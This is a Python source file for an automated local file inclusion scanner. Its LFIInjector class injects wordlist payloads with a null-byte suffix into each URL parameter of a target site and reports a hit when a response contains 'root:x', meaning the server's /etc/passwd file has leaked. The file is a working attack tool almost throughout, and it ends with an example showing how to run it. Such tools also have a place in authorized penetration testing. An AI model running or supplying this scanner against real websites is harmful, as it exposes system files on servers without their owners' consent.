import requests
import urllib.parse

"""
Input: An url that contains an '=' sign (url), a wordlist containing lfi payloads.
Output: Either a boolean False if payload is unsuccessful, or a URL containing the successful payload.
Preconditions: The URL will contain an '=' sign.
Postconditions: The program will always return a url if the payload is successful otherwise a False.

"""

class LFIInjector:

    url = None
    wordlist = None
    payload = None

    def __init__(self, url, wordlist):
        self.url = urllib.parse.unquote(url)
        self.wordlist = wordlist
        self.payload = ""

    def set_url(self, an_url):
        self.url = an_url

    def get_url(self):
        return self.url

    def set_payload(self, a_payload):
        self.payload = "=" + a_payload + "%00"

    def get_payload(self):
        return self.payload

    def get_wordlist(self):
        return self.wordlist

    def is_vulnerable(self, new_url):
        source = requests.get(new_url).text
        if "root:x" in source:
            return True
        else:
            return False

    def iterate(self, split):
        new_url = self.get_url().replace(split, split + self.get_payload())
        new_url = new_url.split("%00")[0]
        return new_url

    def main(self):
        for payload in self.get_wordlist():
            self.set_payload(payload.strip('\n'))
            split_url = self.get_url().split('=')
            for split in split_url[:-1]:
                new_url = self.iterate(split)
                print(new_url)
                is_vulnerable = self.is_vulnerable(new_url)
                if is_vulnerable:
                    return new_url
        return False


"""
# Example usage:
# url = 'http://blah.com/test=apples&next=banana'
# worker = LFIInjector(url, open("lfi_wordlist", "r+"))
# worker.main()
"""